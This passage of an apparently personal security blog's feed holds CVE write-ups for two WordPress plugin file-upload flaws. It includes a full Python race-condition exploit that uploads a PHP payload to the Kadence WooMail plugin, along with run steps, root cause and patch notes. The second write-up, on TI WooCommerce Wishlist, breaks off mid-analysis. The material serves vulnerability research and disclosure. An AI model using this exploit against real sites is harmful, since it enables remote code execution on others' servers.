1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;A[&amp;#34;Upload file via HTTP POST (kt-woomail-import &amp;#43; kadence-woomail-import-file)&amp;#34;] --&amp;gt; B[&amp;#34;wp_handle_upload($_FILES[&amp;#39;kadence-woomail-import-file&amp;#39;], $overrides) called&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;File written to /wp-content/uploads/year/month/filename&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;file_exists($file[&amp;#39;file&amp;#39;]) → file_get_contents($file[&amp;#39;file&amp;#39;])&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;json_decode($raw) — attempt parse as JSON&amp;#34;]&#xA;E --&amp;gt; F[&amp;#34;If JSON invalid → base64_decode($raw) → unserialize()/mb_unserialize()&amp;#34;]&#xA;F --&amp;gt; G[&amp;#34;Process/import template data&amp;#34;]&#xA;G --&amp;gt; H[&amp;#34;unlink($file[&amp;#39;file&amp;#39;]) — delete uploaded file&amp;#34;]&#xA;H --&amp;gt; I[&amp;#34;File removed from filesystem&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ol&gt;&#xA;&lt;li&gt;Create a script that runs parallel upload and checks&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;import requests&#xA;from concurrent.futures import ThreadPoolExecutor&#xA;from datetime import datetime&#xA;import threading&#xA;&#xA;proxies = {&#xA;    &amp;#34;http&amp;#34;: &amp;#34;127.0.0.1:8080&amp;#34;,&#xA;    &amp;#34;https&amp;#34;: &amp;#34;127.0.0.1:8080&amp;#34;&#xA;}&#xA;&#xA;headers = {&#xA;    &amp;#34;User-Agent&amp;#34;: &amp;#34;curl/8.14.1&amp;#34;,&#xA;    &amp;#34;Accept&amp;#34;: &amp;#34;*/*&amp;#34;,&#xA;    &amp;#34;Connection&amp;#34;: &amp;#34;keep-alive&amp;#34;,&#xA;    &amp;#34;Cookie&amp;#34;: (&#xA;        &amp;#34;wordpress_86a9106ae65537651a8e456835b316ab=admin%7C1762274887%7Chr4bin8jsMpo40hHg8Ur3qVNiF2OrE8mhxy9mPjA4UV%7Ca49c2954010c0eed18aa2f49d261d70770dcf11a5cef221c9d43e56ed432f582; &amp;#34;&#xA;        &amp;#34;wordpress_test_cookie=WP%20Cookie%20check; &amp;#34;&#xA;        &amp;#34;wordpress_logged_in_86a9106ae65537651a8e456835b316ab=admin%7C1762274887%7Chr4bin8jsMpo40hHg8Ur3qVNiF2OrE8mhxy9mPjA4UV%7C514daa3c360a345b63ade229b137259ed3eed64ed9a7d2ac6679bb64774956be; &amp;#34;&#xA;        &amp;#34;mailpoet_subscriber=%7B%22subscriber_id%22%3A1%7D&amp;#34;&#xA;    )&#xA;}&#xA;&#xA;php_payload = &amp;#39;&amp;lt;?php phpinfo(); ?&amp;gt;&amp;#39;&#xA;&#xA;upload_url = &amp;#34;http://localhost/wp-admin/customize.php?kt-woomail-customize=1&amp;#34;&#xA;check_url = &amp;#34;http://localhost/wp-content/uploads/&amp;lt;year&amp;gt;/&amp;lt;month&amp;gt;/&amp;lt;filename&amp;gt;.php&amp;#34;&#xA;&#xA;UPLOAD_THREADS = 40&#xA;CHECK_THREADS = 40&#xA;&#xA;upload_success_detected = threading.Event()&#xA;&#xA;def upload_worker(_):&#xA;    session = requests.Session()&#xA;    session.headers.update(headers)&#xA;    session.verify = False&#xA;&#xA;    files = {&#xA;        &amp;#39;kt-woomail-import&amp;#39;: (None, &amp;#39;5afa8d8781&amp;#39;),&#xA;        &amp;#39;kadence-woomail-import-file&amp;#39;: (&amp;#39;&amp;lt;filename&amp;gt;.php&amp;#39;, php_payload, &amp;#39;application/octet-stream&amp;#39;)&#xA;    }&#xA;&#xA;    while not upload_success_detected.is_set():&#xA;        try:&#xA;            response = session.post(&#xA;                upload_url,&#xA;                files=files,&#xA;                timeout=10&#xA;            )&#xA;&#xA;            ts = datetime.now().strftime(&amp;#34;%H:%M:%S&amp;#34;)&#xA;            if 200 &amp;lt;= response.status_code &amp;lt; 300:&#xA;                print(f&amp;#34;\033[92m[{ts}] [UPLOAD] Sent | 200 OK\033[0m&amp;#34;)&#xA;            else:&#xA;                print(f&amp;#34;\033[93m[{ts}] [UPLOAD] Failed | {response.status_code}\033[0m&amp;#34;)&#xA;&#xA;        except Exception as e:&#xA;            print(f&amp;#34;\033[91m[{datetime.now().strftime(&amp;#39;%H:%M:%S&amp;#39;)}] [UPLOAD ERROR] {e}\033[0m&amp;#34;)&#xA;&#xA;def check_worker(_):&#xA;    session = requests.Session()&#xA;    session.proxies.update(proxies)&#xA;    session.verify = False&#xA;&#xA;    while not upload_success_detected.is_set():&#xA;        try:&#xA;            response = session.get(check_url, timeout=8)&#xA;&#xA;            ts = datetime.now().strftime(&amp;#34;%H:%M:%S&amp;#34;)&#xA;            if response.status_code == 200 and len(response.text) &amp;gt; 0:&#xA;                print(f&amp;#34;\n\033[101m[{ts}] [RCE DETECTED!] File uploaded &amp;amp; executed!\033[0m&amp;#34;)&#xA;                upload_success_detected.set()&#xA;                break&#xA;            else:&#xA;                print(f&amp;#34;[{ts}] [CHECK] {response.status_code} | Not found yet...&amp;#34;)&#xA;&#xA;        except Exception as e:&#xA;            print(f&amp;#34;[{datetime.now().strftime(&amp;#39;%H:%M:%S&amp;#39;)}] [CHECK ERROR] {e}&amp;#34;)&#xA;&#xA;if __name__ == &amp;#34;__main__&amp;#34;:&#xA;    print(&amp;#34;\033[96m&amp;#34; &amp;#43; &amp;#34;=&amp;#34;*60)&#xA;    print(&amp;#34;   WORDPRESS KADENCE WOOMAIL UPLOAD EXPLOIT&amp;#34;)&#xA;    print(&amp;#34;   Upload &amp;#43; Auto Check Parallel Threads&amp;#34;)&#xA;    print(&amp;#34;=&amp;#34;*60 &amp;#43; &amp;#34;\033[0m&amp;#34;)&#xA;    print(f&amp;#34;[*] Upload URL : {upload_url}&amp;#34;)&#xA;    print(f&amp;#34;[*] Check URL  : {check_url}&amp;#34;)&#xA;    print(f&amp;#34;[*] Threads    : {UPLOAD_THREADS} (upload) &amp;#43; {CHECK_THREADS} (check)&amp;#34;)&#xA;    print(&amp;#34;[*] Press Ctrl&amp;#43;C to stop\n&amp;#34;)&#xA;&#xA;    try:&#xA;        with ThreadPoolExecutor(max_workers=UPLOAD_THREADS &amp;#43; CHECK_THREADS) as executor:&#xA;            upload_futures = [executor.submit(upload_worker, i) for i in range(UPLOAD_THREADS)]&#xA;            &#xA;            check_futures = [executor.submit(check_worker, i) for i in range(CHECK_THREADS)]&#xA;            &#xA;            upload_success_detected.wait()&#xA;&#xA;    except KeyboardInterrupt:&#xA;        print(&amp;#34;\n\033[93m[!] Stopped by user.\033[0m&amp;#34;)&#xA;    finally:&#xA;        upload_success_detected.set() &#xA;        print(&amp;#34;\033[91m[!] All threads terminated.\033[0m&amp;#34;)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Specifically:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;The script performs concurrent upload and checks; it stops only when the check returns (&lt;code&gt;status=200&lt;/code&gt;).&lt;/li&gt;&#xA;&lt;li&gt;The check function goes through a BurpSuite proxy to observe responses and filter by status code.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Add cookies and nonce to the script&lt;/li&gt;&#xA;&lt;li&gt;Open BurpSuite to monitor requests/responses from the script.&lt;/li&gt;&#xA;&lt;li&gt;Run the script&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;python3 -m venv venv &#xA;source venv/bin/active&#xA;&#xA;pip install requests&#xA;python script.py&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Terminal Output&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-08-cve-2025-39557/result_terminal.png&#34; title=&#34;Result on terminal&#34; data-thumbnail=&#34;/posts/2025-11-08-cve-2025-39557/result_terminal.png&#34; data-sub-html=&#34;&lt;h2&gt;Result Terminal&lt;/h2&gt;&lt;p&gt;Result on terminal&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-08-cve-2025-39557/result_terminal.png&#39; alt=&#34;Result Terminal&#34; height=&#34;290&#34; width=&#34;647&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Result on terminal&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;BurpSuite Output&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-08-cve-2025-39557/result_burp.png&#34; title=&#34;Result on BurpSuite&#34; data-thumbnail=&#34;/posts/2025-11-08-cve-2025-39557/result_burp.png&#34; data-sub-html=&#34;&lt;h2&gt;Result BurpSuite&lt;/h2&gt;&lt;p&gt;Result on BurpSuite&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-08-cve-2025-39557/result_burp.png&#39; alt=&#34;Result BurpSuite&#34; height=&#34;813&#34; width=&#34;1920&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Result on BurpSuite&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The vulnerability occurs because the plugin skips MIME checking (&lt;code&gt;test_type =&amp;gt; false&lt;/code&gt;) during upload, allowing &lt;code&gt;.php&lt;/code&gt; files to be uploaded. The file is deleted immediately after processing but exists briefly enough to be exploited via a &lt;strong&gt;race condition&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaway&#34;&gt;&lt;span&gt;Key Takeaway&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaway&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Root cause: missing MIME checks + storing temporary files in a public directory.&lt;/li&gt;&#xA;&lt;li&gt;Patched in &lt;strong&gt;1.5.15&lt;/strong&gt; (&lt;code&gt;test_type =&amp;gt; true&lt;/code&gt;).&lt;/li&gt;&#xA;&lt;li&gt;Mitigation: always validate MIME types, avoid storing executable files in public directories.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;File Upload via Race Condition&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Arbitrary File Upload&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/kadence-woocommerce-email-designer/vulnerability/wordpress-kadence-woocommerce-email-designer-plugin-1-5-14-arbitrary-file-upload-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Kadence WooCommerce Email Designer Plugin &amp;lt;= 1.5.14 is vulnerable to Arbitrary File Upload&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-47577 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-11-07-cve-2025-47577/</link>
      <pubDate>Fri, 07 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-11-07-cve-2025-47577/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-07-cve-2025-47577/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;&amp;ldquo;Unrestricted Upload of File with Dangerous Type&amp;rdquo;&lt;/strong&gt; vulnerability in &lt;strong&gt;TemplateInvaders TI WooCommerce Wishlist&lt;/strong&gt; allows uploading a &lt;strong&gt;Web Shell&lt;/strong&gt; to the web server. This issue affects &lt;strong&gt;TI WooCommerce Wishlist&lt;/strong&gt;: from &lt;strong&gt;n/a&lt;/strong&gt; to &lt;strong&gt;before 2.10.0&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-47577&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-47577&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Arbitrary File Upload&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 2.9.2&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 2.10.0&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (10)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/ti-woocommerce-wishlist/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress TI WooCommerce Wishlist Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin versions&lt;/strong&gt; - &lt;strong&gt;TI WooCommerce Wishlist&lt;/strong&gt;: &lt;strong&gt;2.9.2&lt;/strong&gt; (vulnerable) and &lt;strong&gt;2.10.0&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; - &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff tool to check and compare differences between versions.&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://wordpress.org/plugins/woocommerce/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;WooCommerce&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://wordpress.org/plugins/wc-fields-factory/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;WC Fields Factory&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch Diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;function tinvwl_upload_file_wc_fields_factory( $file ) {&#xA;&#x9;if ( ! function_exists( &amp;#39;wp_handle_upload&amp;#39; ) ) {&#xA;&#x9;&#x9;require_once( ABSPATH . &amp;#39;wp-admin/includes/file.php&amp;#39; );&#xA;&#x9;}&#xA;&#x9;$upload = wp_handle_upload(&#xA;&#x9;&#x9;$file,&#xA;&#x9;&#x9;[&#xA;&#x9;&#x9;&#x9;&amp;#39;test_form&amp;#39; =&amp;gt; false,&#xA;&#x9;&#x9;&#x9;&amp;#39;test_type&amp;#39; =&amp;gt; false,&#xA;&#x9;&#x9;]&#xA;&#x9;);&#xA;&#xA;&#x9;return $upload;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In the vulnerable version, the function &lt;code&gt;tinvwl_upload_file_wc_fields_factory()&lt;/code&gt; calls &lt;code&gt;wp_handle_upload()&lt;/code&gt; to upload files into WordPress&amp;rsquo;s official uploads directory (&lt;code&gt;wp-content/uploads/&amp;lt;year&amp;gt;/&amp;lt;month&amp;gt;/&lt;/code&gt;).&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition bug open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Bug&lt;/div&gt;&#xA;  &lt;div 